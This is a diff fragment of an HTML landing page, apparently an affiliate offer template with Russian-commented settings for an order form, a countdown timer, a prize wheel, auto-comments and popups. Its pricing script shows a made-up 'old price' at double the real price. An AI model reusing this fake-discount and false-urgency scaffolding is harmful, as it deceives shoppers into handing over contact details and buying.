+        var currencyMain = document.getElementsByClassName("currencyMain");
+    
+    
+        for (var i = 0; i < productName.length; i++) {
+            productName[i].innerHTML = offer_params.productName;
+        }
+        for (var i = 0; i < priceMain.length; i++) {
+            priceMain[i].innerHTML = offer_params.priceMain;
+        }
+    
+    
+        if(offer_params.customPriceOld){
+            for (var i = 0; i < priceOld.length; i++) {
+                priceOld[i].innerHTML = offer_params.customPriceOld;
+            }
+        }else{
+            for (var i = 0; i < priceOld.length; i++) {
+                priceOld[i].innerHTML = offer_params.priceMain * 2;
+            }
+        }
+    
+    
+        for (var i = 0; i < currencyMain.length; i++) {
+            currencyMain[i].innerHTML = offer_params.currencyMain;
+        }
+     </script>
+ 
+ 
+ <script>
+    var usr = '{t2}';
+    var sabss = '{clickid}';
+    initFeatures({
+        priceMain : offer_params.priceMain,
+        currencyMain : offer_params.currencyMain,
+        lang : 'hu', // список языков - vn, it, es, co, hr, en, de, fr, ph, cz, id, th, gr, bg, al, ro, sg, en_sg, mk, si, sk, lv, hu, pl, lt, pt
+        product : offer_params.productName, // название продукта
+        genderTargetting : 'all', // пол целевой аудитории - all, male, female
+ 
+ 
+ 
+ 
+        form : {
+            isNeeded : 1, // 1-включить форму, 0-выключить
+            img: 'prod.png', // путь до картинки продукта
+            price: true, // плашка с ценой
+            priceBrFix: true, // фиксит отображение цен в ценике (true - уберает перенос строки)
+            showSelect: false, // показывать или скрывать поле select
+            untilExpire: 600 // таймер окончания акции где 600 = 10мин. Ставим 0 если таймер не нужен.
+        },
+ 
+ 
+ 
+ 
+        autoComments: {
+            isNeeded: 0, // 1-включить автокомы, 0-выключить
+            bgColor: '#d7f2d8' // цвет фона блока комчиков
+        },
+ 
+ 
+ 
+ 
+        popups: {
+            isNeeded: 0, // 1-включить попы, 0-выключить
+            bgColor: 'rgba(87, 86, 141, 0.8)', // цвет фона сообщения
+            textColor: '#fff', // цвет основного текста сообщения
+            emphColor: 'cyan', // цвет выделений в сообщениях (например, 'со скидкой XX%', '' )
+            blackIcons: false // черные или белые иконки, значения true или false
+        },
+ 
+ 
+ 
+ 
+        wheel: {
+            isNeeded: 1, // 1-включить колесо, 0-выключить
+            customWheel: false // ссылка на свое колесо, либо false
+        }
+    });
+ </script>
+ <script>
+    $('[name="name"]').on('input change', function () {
+        var val = $(this).val();
+        $(this).val(val.replace(/[0-9+]/g, ''));
+    });
+    $('[name="name"]').attr('autocomplete', 'name');
+    $('[name="name"]').attr('pattern', '.{2,25}');
+    $('[name="phone"]').on('input change', function (e) {
+        var val = $(this).val();
+        $(this).val(val.replace(/[A-zА-яіїЁё ]/g, ''));
+    });
+    $('[name="phone"]').get(0).type = 'tel';
+    $('[name="phone"]').attr('autocomplete', 'tel');
+    $('[name="phone"]').attr('pattern', '.{6,18}')
+ </script>
+</body>
+
+</html>
